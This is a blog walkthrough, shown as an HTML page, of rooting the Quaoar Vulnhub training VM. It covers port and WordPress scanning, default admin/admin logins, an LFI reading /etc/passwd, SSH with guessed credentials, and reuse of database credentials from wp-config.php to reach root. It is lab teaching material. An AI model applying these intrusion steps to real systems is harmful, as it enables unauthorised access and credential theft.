@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.6" />
+
+    
+    
+    
+
+<title>Quaoar Virtual Machine - Walkthrough • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Quaoar Virtual Machine - Walkthrough"/>
+<meta name="twitter:description" content="&ldquo;Quaoar&rdquo; is a &ldquo;Boot2Root&rdquo; VM originally created for the Hackfest 2016 CTF. It aims to train your computer security skills. You just have to launch the Virtual Machine, and then find a way to get root ! This VM is in free access on Vulnhub."/>
+
+<meta property="og:title" content="Quaoar Virtual Machine - Walkthrough" />
+<meta property="og:description" content="&ldquo;Quaoar&rdquo; is a &ldquo;Boot2Root&rdquo; VM originally created for the Hackfest 2016 CTF. It aims to train your computer security skills. You just have to launch the Virtual Machine, and then find a way to get root ! This VM is in free access on Vulnhub." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haaxmax.github.io/en/walkthroughs/vulnhub/quaoar-virtual-machine/" />
+<meta property="article:published_time" content="2017-11-20T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2017-11-20T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      
+          <a href="https://haaxmax.github.io/en">
+          
+          
+          
+          <div class="author-image">
+            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+        
+      <p class="site__description">
+        <a href="https://haaxmax.github.io">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/en/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haaxmax" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	&nbsp;<a href="https://haaxmax.github.io/en/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/fr/walkthroughs/vulnhub/quaoar-virtual-machine/" hreflang="fr" lang="fr" class="langLink">Français</a>
+      <a rel="alternate" href="/fr/walkthroughs/vulnhub/quaoar-virtual-machine/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2019 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>Quaoar Virtual Machine - Walkthrough</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Nov 20, 2017
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 8 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>&ldquo;Quaoar&rdquo; is a &ldquo;Boot2Root&rdquo; VM originally created for the Hackfest 2016 CTF. It aims to train your computer security skills. You just have to launch the Virtual Machine, and then find a way to get root ! This VM is in free access on Vulnhub.</p>
+
+<p>We just ping the IP adress given by the VM to ensure everything is alright.</p>
+
+<pre><code>$ ping -c 3 192.168.56.101
+PING 192.168.56.101 (192.168.56.101) 56(84) bytes of data.
+64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.275 ms
+64 bytes from 192.168.56.101: icmp_seq=2 ttl=64 time=0.438 ms
+64 bytes from 192.168.56.101: icmp_seq=3 ttl=64 time=0.265 ms
+
++++ 192.168.56.101 ping statistics +++
+3 packets transmitted, 3 received, 0% packet loss, time 2039ms
+rtt min/avg/max/mdev = 0.265/0.326/0.438/0.079 ms
+</code></pre>
+
+<p>And.. Let&rsquo;s go!</p>
+
+<h2 id="discovery">Discovery</h2>
+
+<p>We first want to know what is running on the system and what we can access remotely, so, we start by scanning ports using <strong>Nmap</strong>.</p>
+
+<pre><code>$ sudo nmap -sS -O -sV -p- 192.168.56.101
+
+Starting Nmap 7.31 ( https://nmap.org ) at 2017-04-10 12:23 CEST
+Nmap scan report for 192.168.56.101
+Host is up (0.00021s latency).
+Not shown: 65526 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+53/tcp  open  domain      ISC BIND 9.8.1-P1
+80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
+110/tcp open  pop3        Dovecot pop3d
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+993/tcp open  ssl/imap    Dovecot imapd
+995/tcp open  ssl/pop3    Dovecot pop3d
+MAC Address: 08:00:27:BC:E9:82 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.5
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.15 seconds
+</code></pre>
+
+<p>Several open ports, let&rsquo;s go deeper !</p>
+
+<p>As long as there are often many possibilities concerning the web part, we will start our investigation on the HTTP service, running on the port 80. Let&rsquo;s check what we have if we try to access the IP address on a browser.</p>
+
+<p><center><img src="/img/walkthrough/quaoar-virtual-machine/quaoar_1.png" alt="quaoar_1.png" class="imgSize"/></center></p>
+
+<p>The nmap scan revealed we can access a robots.txt, let&rsquo;s see how much information we can get!</p>
+
+<p><center><img src="/img/walkthrough/quaoar-virtual-machine/quaoar_2.png" alt="quaoar_2.png" class="imgSize"/></center></p>
+
+<p>Hmm hmm.. It seems we have a wordpress running on that site! We use <strong>WPScan</strong> to check the wordpress version, possible vulnerabilites and enumerate users.</p>
+
+<pre><code>$ sudo wpscan --url http://192.168.56.101/wordpress --enumerate u
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 2.9.2
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://192.168.56.101/wordpress/
+[+] Started: Mon Apr 10 12:53:49 2017
+
+[!] The WordPress 'http://192.168.56.101/wordpress/readme.html' file exists exposing a version number
+[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
+[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
+[+] XML-RPC Interface available under: http://192.168.56.101/wordpress/xmlrpc.php
+[!] Upload directory has directory listing enabled: http://192.168.56.101/wordpress/wp-content/uploads/
+[!] Includes directory has directory listing enabled: http://192.168.56.101/wordpress/wp-includes/
+
+[+] WordPress version 3.9.14 (Released on 2016-09-07) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
+[!] 8 vulnerabilities identified from the version number
+
+[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
+    Reference: https://wpvulndb.com/vulnerabilities/8716
+    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
+[i] Fixed in: 3.9.15
+
+
+...
+
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found
+
+[+] Enumerating usernames ...
+[+] Identified the following 2 user/s:
+    ++++-+++++++--+++++++--+
+    | Id | Login  | Name   |
+    ++++-+++++++--+++++++--+
+    | 1  | admin  | admin  |
+    | 2  | wpuser | wpuser |
+    ++++-+++++++--+++++++--+
+[!] Default first WordPress username 'admin' is still used
+
+[+] Finished: Mon Apr 10 12:53:54 2017
+[+] Requests Done: 61
+[+] Memory used: 17.465 MB
+[+] Elapsed time: 00:00:05
+</code></pre>
+
+<p>Old version.. Many vulns found! We will see later if one of these can be exploited, but for now, the most interesting thing is that the default user &ldquo;admin&rdquo; is still used!</p>
+
+<h2 id="getting-a-web-access-and-a-shell">Getting a web access and a Shell</h2>
+
+<p>Let&rsquo;s try the connect on the /wp-admin/ using the default credentials, admin/admin.</p>
+
+<p><center><img src="/img/walkthrough/quaoar-virtual-machine/quaoar_3.png" alt="quaoar_3.png" class="imgSize"/></center></p>
+
+<p>It works! Not sure if this is great or sad.. Anyway! WPScan didn&rsquo;t find any plugins, let&rsquo;s see manually if some plugins are installed.</p>
+
+<p><center><img src="/img/walkthrough/quaoar-virtual-machine/quaoar_4.png" alt="quaoar_4.png" class="imgSize"/></center></p>
+
+<p>&ldquo;Mail Masta&rdquo; version 1.0.. After a quick search on Big Brother, we find out that this plug-in contains several vulnerabilities, like SQL Injection or Local File Inclusion. We will try to exploit <a href="https://www.exploit-db.com/exploits/40290/" target="\_blank" rel="noopener">this LFI</a> and try to get the /etc/passwd file.</p>
+
+<p><center><img src="/img/walkthrough/quaoar-virtual-machine/quaoar_5.png" alt="quaoar_5.png" class="imgSize"/></center></p>
+
+<p>Ok, nice, now we have a list of users on the target system. Many users are quite common on servers like this, but the last one can be quite interesting. We have a &ldquo;wpadmin&rdquo; user. If we think the same way as before, the wordpress administrator used the default password for his website, so why would he change his password on the machine ?</p>
+
+<p>We saw in the previous scan that SSH service available on the port 22. Let&rsquo;s try to connect in <strong>SSH</strong> using the wpadmin user.. and &ldquo;wpadmin&rdquo; as password!</p>
+
+<pre><code>$ ssh wpadmin@192.168.56.101
+wpadmin@192.168.56.101's password:
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Mon Apr 10 09:15:30 EDT 2017
+
+  System load:  0.0               Processes:             99
+  Usage of /:   35.4% of 7.21GB   Users logged in:       0
+  Memory usage: 43%               IP address for eth0:   192.168.56.101
+  Swap usage:   0%                IP address for virbr0: 192.168.122.1
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Mon Apr 10 08:02:43 2017 from 192.168.56.1
+$ whoami
+wpadmin
+$
+</code></pre>
+
+<p>Once again, it works..!</p>
+
+<p>We can grab the first flag 🙂</p>
+
+<pre><code>$ ls
+flag.txt
+$ cat flag.txt
+2bafe61f03117ac66a73c3c514de796e
+</code></pre>
+
+<h2 id="rooting-time">Rooting time !</h2>
+
+<p>From now, we are connected to the target system and we can start to collect more information. What&rsquo;s the OS ? What is running on the system ?</p>
+
+<pre><code>$ uname -a
+Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux
+</code></pre>
+
+<p>Kernel 3.2.0.. Pretty old, let&rsquo;s look for an exploit on internet..</p>
+
+<p>We found several possible exploits, including the famous <a href="https://dirtycow.ninja/" target="\_blank" rel="noopener">Dirtyc0w</a>. Unfortunately, gcc is not installed on the system. We tried to cross compile exploits and then upload them on the system using the &ldquo;scp&rdquo; command, but no one worked. We have to find another way, maybe easier.. ?</p>
+
+<p>One simple thing we didn&rsquo;t check at the beginning was the usual files used by WordPress. Indeed, we know that CMS like WordPress use configuration files (e.g wp-config.php for WordPress). So let&rsquo;s navigate to WordPress installation folder.</p>
+
+<pre><code class="language-$">$ ls
+index.php    wp-activate.php     wp-comments-post.php  wp-content   wp-links-opml.php  wp-mail.php  wp-trackback.php
+license.txt  wp-admin        wp-config.php         wp-cron.php  wp-load.php        wp-settings.php  xmlrpc.php
+readme.html  wp-blog-header.php  wp-config-sample.php  wp-includes  wp-login.php       wp-signup.php
+$
+</code></pre>
+
+<p>And then, we try to diplay the content of the wp-config.php file.</p>
+
+<pre><code>$ cat wp-config.php
+&lt;?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, WordPress Language, and ABSPATH. You can find more information
+ * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
+ * wp-config.php} Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to &quot;wp-config.php&quot; and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'rootpassword!');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+/** */
+define('WP_HOME','/wordpress/');
+define('WP_SITEURL','/wordpress/');
+
+...
+</code></pre>
+
+<p>Ok, another interesting thing, the WordPress MySQL database credentials, root/rootpassword! The username is root.. Maybe we could try these credentials to log in as root on the system ? we would be very lucky if it works.. But it already worked 2 times, why not a 3rd time ? Let&rsquo;s try this !</p>
+
+<pre><code>$ whoami
+wpadmin
+$ su root
+Password:
+root@Quaoar:/home/wpadmin## whoami
+root
+root@Quaoar:/home/wpadmin#
+</code></pre>
+
+<p>w00t ! It works !</p>
+
+<p>Now, we have the second flag !</p>
+
+<h2 id="conclusion-last-word">Conclusion - Last word</h2>
+
+<p>Even if this Boot2Root VM was not very hard to root, and even if the technical part was not that hard, Quaoar teaches us important things.. Mistakes usually done in the real world.. So please, <strong>DON&rsquo;T USE DEFAULT PASSWORDS AND CHANGE IT!</strong> 😉</p>
+
+<p>It can really give free access to bad people!</p>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-126182747-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
